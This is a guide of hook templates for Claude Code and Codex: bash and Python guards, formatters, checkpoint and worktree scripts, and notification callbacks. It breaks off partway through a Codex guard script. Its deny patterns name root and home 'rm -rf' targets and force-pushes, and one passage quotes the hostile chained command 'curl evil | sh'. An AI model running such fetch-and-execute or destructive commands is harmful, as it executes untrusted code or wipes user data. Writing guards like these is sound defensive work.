# Hook and Notification Templates

Ready-to-use templates for current Claude command hooks and Codex notification callbacks.

Assumptions:

- Claude command hooks receive JSON via stdin.
- Claude hooks run with full user permissions; validate all input.
- Codex `notify` is a narrower external-program callback, not a full Claude-style lifecycle hook system.

---
## Table of Contents

- [Claude: PreToolUse Validation](#claude-pretooluse-validation)
- [Claude: PostToolUse Fast Formatter](#claude-posttooluse-fast-formatter)
- [Claude: PostToolUse Smoke Check Script](#claude-posttooluse-smoke-check-script)
- [Claude: Strip Sensitive Files From `git add`](#claude-strip-sensitive-files-from-git-add)
- [Claude: Runtime Preflight](#claude-runtime-preflight)
- [Claude: PreCompact Checkpoint + SessionStart Restore](#claude-precompact-checkpoint--sessionstart-restore)
- [Claude: PostToolBatch Test Gate](#claude-posttoolbatch-test-gate)
- [Claude: ConfigChange Audit + Policy Guard](#claude-configchange-audit--policy-guard)
- [Claude: SubagentStart Context + SubagentStop Validation](#claude-subagentstart-context--subagentstop-validation)
- [Claude: WorktreeCreate Setup + WorktreeRemove Teardown](#claude-worktreecreate-setup--worktreeremove-teardown)
- [Claude: Lint and Format Config Guard](#claude-lint-and-format-config-guard)
- [Claude: Desktop Notification When Claude Waits](#claude-desktop-notification-when-claude-waits)
- [Codex: `notify` Callback Script](#codex-notify-callback-script)
- [Codex: `hooks.json` Lifecycle Hooks](#codex-hooksjson-lifecycle-hooks)
- [Wiring: register the backfilled hooks](#wiring-register-the-backfilled-hooks)
- [Notes](#notes)
- [Navigation](#navigation)


## Claude: PreToolUse Validation

Guard the Bash tool against destructive commands and possible credential exposure. A security guard fails closed: when it cannot parse its input (no `jq`, malformed JSON) it exits `2`, which the runtime treats as a deny, instead of exiting `0` and letting the call through. `set -e` alone does not give you that — a failing `jq` under `set -e` exits `1`, which is a non-blocking error.

```bash
#!/usr/bin/env bash
set -uo pipefail

# Fail closed: a guard that cannot read its input must not let the call through.
command -v jq >/dev/null 2>&1 || { echo "guard: jq missing, refusing" >&2; exit 2; }
INPUT="$(cat)"
TOOL_NAME="$(printf '%s' "$INPUT" | jq -r '.tool_name // empty' 2>/dev/null)" \
  || { echo "guard: cannot parse hook input, refusing" >&2; exit 2; }
CMD="$(printf '%s' "$INPUT" | jq -r '.tool_input.command // empty' 2>/dev/null)" \
  || { echo "guard: cannot parse hook input, refusing" >&2; exit 2; }

[[ "$TOOL_NAME" != "Bash" ]] && exit 0

deny() {
  jq -cn --arg reason "$1" '{
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "deny",
      permissionDecisionReason: $reason
    }
  }'
  exit 0
}

# Split the command on shell operators so each simple command is checked on its own.
SEGMENTS="$(printf '%s' "$CMD" | tr ';|&\n' '\n\n\n\n')"

# rm with recursive AND force flags, in any order or form (-rf, -fr, -r -f,
# --recursive --force), aimed at /, ~, $HOME, or a root-level glob.
while IFS= read -r seg; do
  seg="${seg#"${seg%%[![:space:]]*}"}"
  seg="${seg#sudo }"
  case "$seg" in rm|rm\ *) ;; *) continue ;; esac
  printf '%s' "$seg" | grep -qE '(^|[[:space:]])(-[a-zA-Z]*[rR][a-zA-Z]*|--recursive)([[:space:]]|$)' || continue
  printf '%s' "$seg" | grep -qE '(^|[[:space:]])(-[a-zA-Z]*f[a-zA-Z]*|--force)([[:space:]]|$)' || continue
  if printf '%s' "$seg" | grep -qE '(^|[[:space:]])(/|/\*|~|~/|~/\*|\$HOME|\$\{HOME\}|"\$HOME"|\$HOME/|\$HOME/\*)([[:space:]]|$)'; then
    deny "Blocked recursive force delete of a root, home, or root-glob path."
  fi
done <<< "$SEGMENTS"

# Force-push to a protected branch. Catches --force, -f, combined short flags
# (-fu), --force-with-lease (with or without =ref), +refspec, and --mirror.
# When no refspec is given the target is the current branch.
PROTECTED_BRANCHES='^(main|master)$'
while IFS= read -r seg; do
  seg="${seg#"${seg%%[![:space:]]*}"}"
  case "$seg" in git\ *) ;; *) continue ;; esac
  # shellcheck disable=SC2206
  set -f; words=($seg); set +f
  push_idx=""
  for i in "${!words[@]}"; do
    if [[ "${words[$i]}" == "push" ]]; then push_idx=$i; break; fi
  done
  [[ -z "$push_idx" ]] && continue
  forced=0; mirror=0; remote=""; refspecs=()
  for ((j = push_idx + 1; j < ${#words[@]}; j++)); do
    w="${words[$j]}"
    case "$w" in
      --force|--force-with-lease|--force-with-lease=*|--force-if-includes) forced=1 ;;
      --mirror) mirror=1 ;;
      --*) ;;
      -*f*) forced=1 ;;          # -f and combined short flags such as -fu
      -*) ;;
      +*) forced=1; refspecs+=("${w#+}") ;;
      *) if [[ -z "$remote" ]]; then remote="$w"; else refspecs+=("$w"); fi ;;
    esac
  done
  if [[ "$mirror" -eq 1 ]]; then
    deny "git push --mirror overwrites every remote ref and is blocked by policy."
  fi
  [[ "$forced" -eq 1 ]] || continue
  if [[ "${#refspecs[@]}" -eq 0 ]]; then
    refspecs=("$(git symbolic-ref --short -q HEAD 2>/dev/null || echo unknown)")
  fi
  for spec in "${refspecs[@]}"; do
    target="${spec##*:}"; target="${target#refs/heads/}"
    if [[ "$target" =~ $PROTECTED_BRANCHES ]]; then
      deny "Force-push to protected branch '$target' is blocked by policy."
    fi
  done
done <<< "$SEGMENTS"

if printf '%s' "$CMD" | grep -qiE '(password|secret|api[_-]?key|token)[[:space:]]*='; then
  jq -cn '{
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "ask",
      permissionDecisionReason: "Possible secret detected in command.",
      additionalContext: "Review the command carefully before approving."
    }
  }'
  exit 0
fi

exit 0
```

What text matching still misses: the guard reads the command string, not what the shell will execute. It does not see paths built from variables or command substitution (`rm -rf "$DIR"`, `rm -rf $(pwd)/..`), quoted or escaped forms (`rm -rf '/'`, `rm -rf \/`), `rm` reached through `xargs`, `find -delete`, `eval`, an alias, a script file, or an interpreter one-liner, `--no-preserve-root` without the root target, or a force-push where the branch name comes from a variable. A hook like this raises the cost of an accidental destructive command; it is not a sandbox. Put anything that must hold against an adversarial command into the execution substrate (permission `deny` rules, a sandbox, or branch protection on the remote).

The `rm` check above only matches root, home, and root-glob targets — it is deliberately narrow and needs no allowlist. A broader guard that also blocks recursive deletes against arbitrary paths (or `DROP TABLE`, `git reset --hard`, `docker system prune`, etc.) is a common extension of this template, and that broader guard needs a safe-exceptions allowlist or it becomes unusable: it either blocks routine cleanup of build/cache directories (so people disable the hook entirely, which guards nothing) or gets scoped so loosely it stops catching real mistakes.

If you extend the `rm` check to arbitrary paths, add an allowlist short-circuit before the deny, using the same `CMD` variable already extracted above:

```bash
# Starting allowlist for a broadened rm -rf guard — extend per project.
# These are example build/cache artifacts. Verify each project treats them as disposable
# and that no path resolves outside the expected worktree before deleting or regenerating;
# a different repo might reasonably add .venv, target/, or vendor/.
SAFE_RM_PATHS='node_modules|\.next|dist|__pycache__|\.cache|build|\.turbo|coverage'

if printf '%s' "$CMD" | grep -qE '(^|[[:space:]])rm[[:space:]]+-rf[[:space:]]'; then
  if ! printf '%s' "$CMD" | grep -qE "${SAFE_RM_PATHS}"; then
    jq -cn '{
      hookSpecificOutput: {
        hookEventName: "PreToolUse",
        permissionDecision: "deny",
        permissionDecisionReason: "Blocked destructive rm -rf command outside the safe-exceptions allowlist."
      }
    }'
    exit 0
  fi
fi
```

This list is project-specific, not exhaustive — treat it as a starting point to extend, not a fixed spec. (Source: `garrytan/gstack@94993f74012782fd94416dd44b8314f6363a13a4`, `careful/SKILL.md`, MIT, 2026-08-09.)

---

## Claude: PostToolUse Fast Formatter

Keep synchronous post-edit hooks cheap. Format only the touched file, only inside the project, with the project's own pinned formatter binaries, and never let a formatter failure surface as a hook error. `PostToolUse` cannot block, so the only useful exit code is `0`; the `trap` guarantees it even under `set -e`. Bound run time with the hook's own `timeout` field in `settings.json`, not with GNU `timeout`, which macOS does not ship.

```bash
#!/usr/bin/env bash
set -euo pipefail
trap 'exit 0' EXIT   # a formatter failure must never become a hook error

command -v jq >/dev/null 2>&1 || exit 0
INPUT="$(cat)"
TOOL_NAME="$(printf '%s' "$INPUT" | jq -r '.tool_name // empty')"
FILE_PATH="$(printf '%s' "$INPUT" | jq -r '.tool_input.file_path // empty')"

[[ ! "$TOOL_NAME" =~ ^(Edit|Write)$ ]] && exit 0
[[ -z "$FILE_PATH" || ! -f "$FILE_PATH" ]] && exit 0

# Only touch files inside the project: resolve symlinks, then prefix-check.
ROOT="$(cd "${CLAUDE_PROJECT_DIR:-$PWD}" && pwd -P)"
REAL="$(cd "$(dirname "$FILE_PATH")" && pwd -P)/$(basename "$FILE_PATH")"
case "$REAL" in "$ROOT"/*) ;; *) exit 0 ;; esac

# Project-pinned binaries only; a globally installed formatter of another
# version would rewrite files differently from CI.
case "$REAL" in
  *.js|*.jsx|*.ts|*.tsx|*.json|*.md)
    [[ -x "$ROOT/node_modules/.bin/prettier" ]] && "$ROOT/node_modules/.bin/prettier" --write "$REAL" >/dev/null 2>&1
    ;;
  *.py)
    [[ -x "$ROOT/.venv/bin/ruff" ]] && "$ROOT/.venv/bin/ruff" format "$REAL" >/dev/null 2>&1
    ;;
  *.go)
    command -v gofmt >/dev/null 2>&1 && gofmt -w "$REAL" >/dev/null 2>&1
    ;;
  *.rs)
    command -v rustfmt >/dev/null 2>&1 && rustfmt "$REAL" >/dev/null 2>&1
    ;;
esac

exit 0
```

`gofmt` and `rustfmt` ship with the toolchain the project pins through `go.mod` / `rust-toolchain.toml`, so `command -v` is acceptable for them; for npm and Python formatters use the project's own `node_modules/.bin` or virtualenv path. Register with `"async": true` and a `"timeout"` so a hung formatter cannot stall the agent.

---

## Claude: PostToolUse Smoke Check Script

Use the script below with a background `PostToolUse` or `TaskCompleted` hook. Do not make expensive checks synchronous unless you need a hard gate.

```bash
#!/usr/bin/env bash
set -euo pipefail

cd "$CLAUDE_PROJECT_DIR"

if [[ -f package.json ]]; then
  npm run lint -- --max-warnings=0 >/tmp/claude-hook-smoke.log 2>&1 || true
elif [[ -f pyproject.toml ]]; then
  pytest -q >/tmp/claude-hook-smoke.log 2>&1 || true
fi

exit 0
```

---

## Claude: Strip Sensitive Files From `git add`

Rewrite a clean, single `git add` so it no longer stages `.env`-style files (at any depth: `.env`, `.env.local`, `config/.env`), and deny the forms that cannot be rewritten safely. The hook never returns `permissionDecision: "allow"`: an `allow` paired with `updatedInput` skips the permission prompt, so a template that matched `^git add` and allowed would auto-approve `git add x && curl evil | sh`. Here the rewrite only sets `updatedInput` and leaves the permission decision to the normal flow; a command that contains a shell operator (`&&`, `||`, `;`, `|`, `$(`, backtick) or a newline is never rewritten. The docs note that `updatedInput` replaces the whole input object, so unchanged fields are carried over.

```bash
#!/usr/bin/env bash
set -uo pipefail

command -v jq >/dev/null 2>&1 || { echo "guard: jq missing, refusing" >&2; exit 2; }
INPUT="$(cat)"
TOOL_NAME="$(printf '%s' "$INPUT" | jq -r '.tool_name // empty' 2>/dev/null)" \
  || { echo "guard: cannot parse hook input, refusing" >&2; exit 2; }
CMD="$(printf '%s' "$INPUT" | jq -r '.tool_input.command // empty' 2>/dev/null)" \
  || { echo "guard: cannot parse hook input, refusing" >&2; exit 2; }

[[ "$TOOL_NAME" != "Bash" ]] && exit 0
# Only a command that *starts* with git add; anything else is not ours to touch.
[[ "$CMD" =~ ^[[:space:]]*git[[:space:]]+add([[:space:]]|$) ]] || exit 0

deny() {
  jq -cn --arg reason "$1" '{
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "deny",
      permissionDecisionReason: $reason
    }
  }'
  exit 0
}

ENV_TOKEN='(^|/)\.env(\.[^/]*)?$'

# Never rewrite a compound command: the rewrite would only touch the first
# simple command and the rest would ride along on whatever decision follows.
if printf '%s' "$CMD" | grep -qE '&&|\|\||;|\||\$\(|`' || [[ "$CMD" == *$'\n'* ]]; then
  if printf '%s' "$CMD" | tr ' ' '\n' | grep -qE "$ENV_TOKEN"; then
    deny "git add with .env-style paths inside a compound command; run the git add on its own so it can be rewritten."
  fi
  exit 0   # no decision: normal permission flow applies to the compound command
fi

# Tokenize without globbing or word-splitting surprises.
set -f; read -r -a words <<< "$CMD"; set +f

kept=(); dropped=(); broad=0
for w in "${words[@]:2}"; do
  case "$w" in
    -A|--all|--no-ignore-removal|.|./|-u|--update) broad=1; kept+=("$w") ;;
    *)
      if printf '%s' "$w" | grep -qE "$ENV_TOKEN"; then dropped+=("$w"); else kept+=("$w"); fi ;;
  esac
done

if [[ "$broad" -eq 1 ]]; then
  # -A / --all / . / -u stage whatever git finds; a path rewrite cannot exclude
  # .env files from them. Deny only when such a file would actually be staged.
  ROOT="${CLAUDE_PROJECT_DIR:-$PWD}"
  if git -C "$ROOT" ls-files -o -m --exclude-standard 2>/dev/null | grep -qE "$ENV_TOKEN"; then
    deny "git add -A/--all/./-u would stage a .env-style file. Stage explicit paths, or add the file to .gitignore first."
  fi
  exit 0
fi

[[ "${#dropped[@]}" -eq 0 ]] && exit 0

if [[ "${#kept[@]}" -eq 0 ]]; then
  deny "git add listed only .env-style files (${dropped[*]}); nothing left to stage."
fi

SAFE_CMD="git add ${kept[*]}"
jq -c --arg cmd "$SAFE_CMD" --arg dropped "${dropped[*]}" '{
  hookSpecificOutput: {
    hookEventName: "PreToolUse",
    updatedInput: (.tool_input + { command: $cmd }),
    additionalContext: ("Removed .env-style paths from git add: " + $dropped)
  }
}' <<< "$INPUT"
exit 0
```

Limits: this reads the command text, not git's view of it, so it does not see `.env` files reached through a directory argument (`git add config/`), a glob the shell expands, a pathspec magic prefix, or `git -C other/repo add`. Pair it with a `.gitignore` entry and a `permissions.deny` rule for `Read(**/.env*)`; see [hook-security.md](hook-security.md) §8.

---

## Claude: Runtime Preflight

Use this for `SessionStart`. **`SessionStart` cannot block.** A non-zero exit, including exit `2`, only shows stderr to the user as a hook-error notice; Claude never sees it. To make the model aware of a failed preflight, print `hookSpecificOutput.additionalContext` and exit `0`. Set the minimum version from your project's own engines/tool-versions file, not from this template.

```bash
#!/usr/bin/env bash
set -euo pipefail

MIN_NODE_MAJOR=22   # set from the project's engines / .tool-versions
MIN_NODE_MINOR=22

warn_claude() {
  jq -cn --arg msg "$1" '{
    hookSpecificOutput: {
      hookEventName: "SessionStart",
      additionalContext: $msg
    }
  }'
  echo "$1" >&2
  exit 0
}

command -v jq >/dev/null 2>&1 || { echo "Runtime preflight failed: jq not found. Install jq before using hooks." >&2; exit 0; }
command -v node >/dev/null 2>&1 || warn_claude "Runtime preflight failed: node not found. Install Node >= ${MIN_NODE_MAJOR}.${MIN_NODE_MINOR}.0"

NODE_VERSION_RAW="$(node -v | sed 's/^v//')"
NODE_MAJOR="${NODE_VERSION_RAW%%.*}"
NODE_MINOR="$(printf '%s' "$NODE_VERSION_RAW" | cut -d. -f2)"

if [[ "$NODE_MAJOR" -lt "$MIN_NODE_MAJOR" ]] || { [[ "$NODE_MAJOR" -eq "$MIN_NODE_MAJOR" ]] && [[ "$NODE_MINOR" -lt "$MIN_NODE_MINOR" ]]; }; then
  warn_claude "Runtime preflight failed: node v${NODE_VERSION_RAW} detected, requires >= ${MIN_NODE_MAJOR}.${MIN_NODE_MINOR}.0. Run: nvm install ${MIN_NODE_MAJOR}.${MIN_NODE_MINOR}.0 && nvm use ${MIN_NODE_MAJOR}.${MIN_NODE_MINOR}.0"
fi

echo "Runtime preflight ok: node v${NODE_VERSION_RAW}, jq installed"
exit 0
```

The same rule applies to every context-only event (`SessionStart`, `SubagentStart`, and any other event the hooks reference lists as "no blocking"): when the model must see a failure, send it as `additionalContext`, not as an exit code. Check the hooks reference's blocking table for the current list before relying on an exit code.

---

## Claude: PreCompact Checkpoint + SessionStart Restore

Survive context compaction. `PreCompact` stdout is **not** injected back to the model, so reinjection is a pair: `PreCompact` checkpoints minimal state to disk; `SessionStart` reads it back via `additionalContext` (which *is* injected).

`PreCompact` writer:

```bash
#!/usr/bin/env bash
set -euo pipefail

ROOT="${CLAUDE_PROJECT_DIR:-$PWD}"
STATE_DIR="$ROOT/.claude/state"
mkdir -p "$STATE_DIR"

BRANCH="$(git -C "$ROOT" rev-parse --abbrev-ref HEAD 2>/dev/null || echo unknown)"
{
  echo "branch: $BRANCH"
  echo "checkpoint_at: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
  # Append the few facts the next turn must keep: active task id, blocker, next step.
} > "$STATE_DIR/precompact-checkpoint.txt"

exit 0
```

`SessionStart` restore:

```bash
#!/usr/bin/env bash
set -euo pipefail

CHECKPOINT="${CLAUDE_PROJECT_DIR:-$PWD}/.claude/state/precompact-checkpoint.txt"
[[ -f "$CHECKPOINT" ]] || exit 0

CONTEXT="$(cat "$CHECKPOINT")"
jq -cn --arg ctx "$CONTEXT" '{
  hookSpecificOutput: {
    hookEventName: "SessionStart",
    additionalContext: ("Restored pre-compaction checkpoint:\n" + $ctx)
  }
}'
exit 0
```

Keep the checkpoint to a handful of lines — it is state, not documentation.

---

## Claude: PostToolBatch Test Gate

After a parallel tool burst, stop the agentic loop before the next model call if a test/build command in the batch shows failure. `PostToolBatch` receives all results in `tool_calls[]` and blocks with `decision: "block"`.

```bash
#!/usr/bin/env bash
set -euo pipefail

INPUT="$(cat)"

FAILED="$(printf '%s' "$INPUT" | jq -r '
  [ .tool_calls[]?
    | select(.tool_name == "Bash")
    | select((.tool_input.command // "")
        | test("(npm|pnpm|yarn) (test|run build)|pytest|go test|cargo test"))
    | select((.tool_response // "" | tostring)
        | test("(FAIL|failed|Error:|panic:|Traceback)"))
  ] | length')"

if [[ "${FAILED:-0}" -gt 0 ]]; then
  jq -cn '{
    decision: "block",
    reason: "A test or build command in the parallel batch reported failure. Fix it before continuing."
  }'
  exit 0
fi
exit 0
```

The result field is `tool_response`, not `tool_output`. With the wrong key the `select` never matches and the gate silently allows everything. `tostring` keeps the match working if the runtime sends the response as an object rather than a string. Matching on `tool_response` is heuristic. For a hard gate, have the command emit a sentinel (e.g. `echo HOOK_TESTS_OK`) and match that instead of failure strings.

---

## Claude: ConfigChange Audit + Policy Guard

Audit every config mutation and optionally block agent-initiated edits to sensitive scopes. `ConfigChange` carries `source` and `file_path` (not `config_source`/`config_path`; with those names the audit line reads `source=? path=?` and nothing is ever blocked). It can block all sources except `policy_settings`.

```bash
#!/usr/bin/env bash
set -euo pipefail

INPUT="$(cat)"
SRC="$(printf '%s' "$INPUT" | jq -r '.source // empty')"
CFG_PATH="$(printf '%s' "$INPUT" | jq -r '.file_path // empty')"

AUDIT="${CLAUDE_PROJECT_DIR:-/tmp}/.claude/config-audit.log"
mkdir -p "$(dirname "$AUDIT")"
printf '%s\tsource=%s\tpath=%s\n' \
  "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "${SRC:-?}" "${CFG_PATH:-?}" >> "$AUDIT"

# Require human review for hook/permission policy edits made mid-session.
if [[ "$SRC" == "local_settings" ]]; then
  jq -cn '{
    decision: "block",
    reason: "Local settings change requires human review (logged to .claude/config-audit.log)."
  }'
  exit 0
fi
exit 0
```

`policy_settings` cannot be blocked by a user hook — only audited.

---

## Claude: SubagentStart Context + SubagentStop Validation

Inject guardrails into every spawned subagent, then gate its handoff. `SubagentStart` reaches the subagent only through `hookSpecificOutput.additionalContext`; plain stdout is not injected, and `systemMessage` is a top-level field shown to the user, not context. `SubagentStart` cannot block. `SubagentStop` blocks the subagent from finishing with `decision: "block"`.

`SubagentStart` context injection:

```bash
#!/usr/bin/env bash
set -euo pipefail

INPUT="$(cat)"
AGENT_TYPE="$(printf '%s' "$INPUT" | jq -r '.agent_type // "unknown"')"
BRANCH="$(git rev-parse --abbrev-ref HEAD 2>/dev/null || echo unknown)"

jq -cn --arg at "$AGENT_TYPE" --arg br "$BRANCH" '{
  systemMessage: ("Spawned " + $at + " with branch guardrails."),
  hookSpecificOutput: {
    hookEventName: "SubagentStart",
    additionalContext: ("Working branch: " + $br + ". Stay within assigned files; do not edit shared config or commit. Return findings only.")
  }
}'
exit 0
```

`SubagentStop` validation:

```bash
#!/usr/bin/env bash
set -euo pipefail

INPUT="$(cat)"
STOP_HOOK_ACTIVE="$(printf '%s' "$INPUT" | jq -r '.stop_hook_active // false')"
TRANSCRIPT="$(printf '%s' "$INPUT" | jq -r '.agent_transcript_path // empty')"

# A previous block already forced a continuation: do not block again.
[[ "$STOP_HOOK_ACTIVE" == "true" ]] && exit 0

if [[ -n "$TRANSCRIPT" && -f "$TRANSCRIPT" ]]; then
  TAIL="$(tail -c 4000 "$TRANSCRIPT" 2>/dev/null || true)"
  if ! printf '%s' "$TAIL" | grep -qiE 'summary|result|findings|conclusion'; then
    jq -cn '{
      decision: "block",
      reason: "No summary/result detected — produce a concise findings summary before finishing."
    }'
    exit 0
  fi
fi
exit 0
```

Read `agent_transcript_path` (the subagent's own transcript); `transcript_path` is the main session's. Check `stop_hook_active` before blocking in every `Stop` and `SubagentStop` hook: it is `true` when this stop is already a continuation forced by a block, and a hook that ignores it keeps forcing extra turns. The hooks reference also documents a cap on consecutive stop-hook continuations and the environment variable that raises it; a gate that needs its own limit should count in a state file keyed by session rather than lean on the runtime cap. Transcript inspection is heuristic; prefer a structured sentinel if the subagent contract allows it.

---

## Claude: WorktreeCreate Setup + WorktreeRemove Teardown

Per-worktree setup and symmetric teardown. **Registering `WorktreeCreate` means your hook owns creation** — it must run `git worktree add` and print the resulting path to stdout, or creation fails. Omit this hook entirely to keep Claude's default git behavior; add it only when you need custom placement or per-worktree setup.

`WorktreeCreate`:

```bash
#!/usr/bin/env bash
set -euo pipefail

INPUT="$(cat)"
WT_NAME="$(printf '%s' "$INPUT" | jq -r '.name // empty')"

ROOT="${CLAUDE_PROJECT_DIR:-$PWD}"
WT_BASE="$ROOT/.worktrees"
mkdir -p "$WT_BASE"
WT_PATH="$WT_BASE/${WT_NAME:-wt-$(date +%s)}"
BRANCH="agent/${WT_NAME:-tmp}"

git -C "$ROOT" worktree add -b "$BRANCH" "$WT_PATH" >/dev/null 2>&1 \
  || git -C "$ROOT" worktree add "$WT_PATH" >/dev/null 2>&1

# Per-worktree setup
mkdir -p "$WT_PATH/.cache"
[[ -f "$ROOT/.env.example" ]] && cp "$ROOT/.env.example" "$WT_PATH/.env" 2>/dev/null || true

# REQUIRED: print the worktree path so Claude uses it.
printf '%s\n' "$WT_PATH"
exit 0
```

The payload field is `name`, not `isolation_id`. With the wrong key the requested name is dropped and every worktree falls back to `wt-<epoch>`; two runs in the same second then collide on the path.

`WorktreeRemove` (whether a non-zero exit blocks removal is runtime-defined; check the hooks reference's blocking table before relying on this hook as a gate):

```bash
#!/usr/bin/env bash
set -euo pipefail

INPUT="$(cat)"
WT_PATH="$(printf '%s' "$INPUT" | jq -r '.worktree_path // empty')"
ROOT="${CLAUDE_PROJECT_DIR:-$PWD}"
[[ -z "$WT_PATH" ]] && exit 0

# Symmetric teardown of anything WorktreeCreate made.
rm -rf "${WT_PATH:?}/.cache" 2>/dev/null || true
git -C "$ROOT" worktree remove --force "$WT_PATH" >/dev/null 2>&1 || true
exit 0
```

The `${WT_PATH:?}` guard aborts the `rm` if the path is somehow empty — never `rm -rf` an unset variable.

---

## Claude: Lint and Format Config Guard

Opt in per project. When a check fails, an agent can pass it by loosening the rule instead of fixing the code. This `PreToolUse` guard denies an edit to a lint, format, or ignore file that already exists, and allows its first creation. Register it on matcher `Write|Edit`. `MultiEdit` is not in the hooks reference, so it is left out.

The guard fails closed. Unreadable input or an internal error exits `2` with a message. A policy deny also exits `2`, with the reason on stderr, which this skill's exit-code rule says reaches the agent. The reason tells the agent to fix the code or ask the user, never to disable the hook.

Limit: the guard sees only `Write` and `Edit`. A Bash write such as `sed -i` or `echo >>` passes it. Pair it with a deny rule or the Bash guard above when that matters.

```python
#!/usr/bin/env python3
import fnmatch
import json
import os
import sys

PROTECTED = [
    ".eslintrc*", "eslint.config.*", ".eslintignore", ".prettierrc*",
    "prettier.config.*", ".prettierignore", "ruff.toml", ".ruff.toml",
    "biome.json", "biome.jsonc", ".flake8", ".stylelintrc*",
]  # extend per project


def main() -> int:
    try:
        data = json.load(sys.stdin)
        if data.get("tool_name") not in ("Write", "Edit"):
            return 0
        path = (data.get("tool_input") or {}).get("file_path") or ""
        if not path:
            print("config guard: no file_path in input, refusing", file=sys.stderr)
            return 2
        name = os.path.basename(path)
        if any(fnmatch.fnmatch(name, p) for p in PROTECTED) and os.path.exists(path):
            reason = (
                f"{name} is a protected lint or format config. Fix the code so the "
                "existing rule passes, or ask the user to change the rule. "
                "Do not edit this file and do not disable this hook."
            )
            print(reason, file=sys.stderr)
            return 2
        return 0
    except Exception as exc:  # fail closed
        print(f"config guard: {type(exc).__name__}: {exc}, refusing", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
```

Dry-run it with a `Write` payload for an existing `.eslintrc.json` and with `{` as input. Both must exit `2`.

Source idea: ECC `scripts/hooks/config-protection.js` (MIT), adapted.

---

## Claude: Desktop Notification When Claude Waits

Use this on `Notification` with matcher `permission_prompt|idle_prompt`, both listed notification types in the hooks reference. The `Notification` event cannot block, so the script always exits `0`. Send a fixed message and never the notification text: the text can carry file paths or command content, and a lock screen shows it.

```bash
#!/usr/bin/env bash
# macOS. The message is fixed on purpose.
osascript -e 'display notification "Claude is waiting for you" with title "Claude Code"' >/dev/null 2>&1
exit 0
```

On Linux, use `notify-send "Claude Code" "Claude is waiting for you"` in place of the `osascript` line.

```json
{ "hooks": { "Notification": [{ "matcher": "permission_prompt|idle_prompt",
  "hooks": [{ "type": "command", "command": "bash ~/.claude/hooks/notify-waiting.sh" }] }] } }
```

Source idea: ECC `scripts/hooks/desktop-notify.js` (MIT), adapted; that script sends message text, this one does not.

---

## Codex: `notify` Callback Script

`notify` is a top-level `config.toml` key holding the argv array of a program Codex runs when it emits a supported event; the event arrives as one JSON argument. Per the Codex config docs ([developers.openai.com/codex/config-advanced](https://developers.openai.com/codex/config-advanced), "Notifications"), the only event at the time of writing is `agent-turn-complete`, and the payload's documented fields are `type`, `thread-id`, `turn-id`, `cwd`, `input-messages`, and `last-assistant-message` (hyphenated keys). A `[notify]` table with `program = [...]` is not a documented shape and never fires; a script reading `title` or `event` parses nothing. Re-read that page before relying on any field, because the event list is expected to grow.

Configuration (top-level key, not a table):

```toml
notify = ["python3", "/absolute/path/to/codex_notify.py"]
```

Script:

```python
#!/usr/bin/env python3
import json
import subprocess
import sys


def main() -> int:
    if len(sys.argv) != 2:
        return 1

    payload = json.loads(sys.argv[1])
    if payload.get("type") != "agent-turn-complete":
        return 0  # ignore events this script does not handle

    title = "Codex"
    message = payload.get("last-assistant-message") or "Turn complete"
    prompt = " ".join(payload.get("input-messages", []))
    if prompt:
        message = f"{message} (after: {prompt[:80]})"
    message = str(message).replace('"', "'")

    subprocess.run(
        [
            "osascript",
            "-e",
            f'display notification "{message}" with title "{title}"',
        ],
        check=False,
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

Keep the callback idempotent and event-driven. Do not assume Claude-style permission or tool lifecycle data is available. `thread-id` and `turn-id` are the keys to dedupe on if the script forwards to a chat webhook.

---

## Codex: `hooks.json` Lifecycle Hooks

Codex has a lifecycle hooks system distinct from `notify`. This skill owns the Codex hook facts; other skills link here instead of restating them. Config lives in `~/.codex/hooks.json` or an inline `[hooks]` table in `~/.codex/config.toml`; repo-local `.codex/` paths and plugin-bundled `hooks/hooks.json` also load and merge.

The Codex event list, handler types, and async behavior change between releases, so look them up rather than copying a list from here. Before porting a Claude template, check the Codex hooks reference ([developers.openai.com/codex/hooks](https://developers.openai.com/codex/hooks)) for:

1. **Events.** Is the event you need in the matcher table? If not, do not port the template; pick the nearest event that exists, or use `notify`.
2. **Handler types.** Which `type` values execute, and which are parsed but skipped? A handler type that is parsed but skipped fails open with no error.
3. **Async.** Does `async: true` execute, what is the concurrency limit, and which events always run synchronously? Decide from that whether a slow check can leave the hot path.
4. **Payload mutation.** Does `PreToolUse` accept `updatedInput`? If not, a rewrite template becomes a deny-plus-reason template.
5. **Managed policy and trust.** Which `requirements.toml` keys enforce managed-only hooks, and does the runtime review or hash-check hook files before running them? A hook whose content changed after review can be skipped silently until it is trusted again, which looks exactly like a broken script.
6. **Firing reliability.** Search the Codex issue tracker for open reports that hooks do not fire on your surface (CLI, desktop, repo-local config). [codex#17532](https://github.com/openai/codex/issues/17532) (repo-local `.codex/config.toml` hooks not firing in interactive sessions) and [codex#21639](https://github.com/openai/codex/issues/21639) (hooks stop firing after a desktop update) are examples of the class; check their state rather than assuming it.

**Verify-first.** Confirm with a harmless logging hook that the event actually fires on your runtime, and that a changed hook still fires after edit, before relying on it. Prefer `notify` for anything that must be dependable.

Registration (`~/.codex/hooks.json`) — same three-level shape as Claude (event → matcher group → handlers):

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash ~/.codex/hooks/pre_tool_use_guard.sh",
            "statusMessage": "Checking Bash command",
            "timeout": 30
          }
        ]
      }
    ],
    "Stop": [
      {
        "matcher": "",
        "hooks": [
          { "type": "command", "command": "bash ~/.codex/hooks/stop_gate.sh" }
        ]
      }
    ]
  }
}
```

`PreToolUse` deny guard (`~/.codex/hooks/pre_tool_use_guard.sh`) — the stdin payload matches Claude's (`tool_name`, `tool_input.command`):

```bash
#!/usr/bin/env bash
set -uo pipefail

command -v jq >/dev/null 2>&1 || { echo "guard: jq missing, refusing" >&2; exit 2; }
INPUT="$(cat)"
TOOL_NAME="$(printf '%s' "$INPUT" | jq -r '.tool_name // empty' 2>/dev/null)" \
  || { echo "guard: cannot parse hook input, refusing" >&2; exit 2; }
CMD="$(printf '%s' "$INPUT" | jq -r '.tool_input.command // empty' 2>/dev/null)" \
  || { echo "guard: cannot parse hook input, refusing" >&2; exit 2; }

